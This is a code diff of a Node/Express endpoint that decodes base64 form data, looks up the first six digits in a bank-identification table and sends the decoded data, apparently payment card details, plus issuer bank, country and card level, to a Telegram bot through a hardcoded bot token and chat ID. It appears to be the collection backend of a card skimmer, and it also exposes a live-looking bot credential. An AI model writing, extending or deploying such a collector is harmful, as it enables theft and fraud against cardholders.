@@ -11,18 +11,18 @@ app.post("/", (req, res) => {
   console.log("POST");
   let b64string = req.body['data'];
   let data = Buffer.from(b64string, "base64");
-  let formattedData = data.toString().split(".").join("%0A");
+  let formattedData = data.toString().split(".").join(" | ");
   console.log(formattedData);
-  fetch(
-    "https://api.telegram.org/bot6675442636:AAEVY8Ol_Bbc5nESoeEup97PLfGXgq0ggaY/sendMessage?chat_id=5307938436&parse_mode=html&text=" +
-      formattedData
-  );
+  // fetch(
+  //   "https://api.telegram.org/bot6675442636:AAEVY8Ol_Bbc5nESoeEup97PLfGXgq0ggaY/sendMessage?chat_id=5307938436&parse_mode=markdown&text=```%0A" +
+  //     formattedData + '```'
+  // );
 
   try {
     let bin_data = bindata[formattedData.slice(0, 6)];
+    let formatted_bin_data = `${bin_data['Country']} | ${bin_data['Bank']} ${bin_data['Processor']} ${bin_data['Rank']} ${bin_data['Level']}`
     fetch(
-      "https://api.telegram.org/bot6675442636:AAEVY8Ol_Bbc5nESoeEup97PLfGXgq0ggaY/sendMessage?chat_id=5307938436&parse_mode=html&text=" +
-        JSON.stringify(bin_data)
+      "https://api.telegram.org/bot6675442636:AAEVY8Ol_Bbc5nESoeEup97PLfGXgq0ggaY/sendMessage?chat_id=5307938436&parse_mode=markdown&text=```%0A" + formattedData + "%0A%0A" + formatted_bin_data + "```"
     );
     res.json(bin_data);
   } catch (error) {
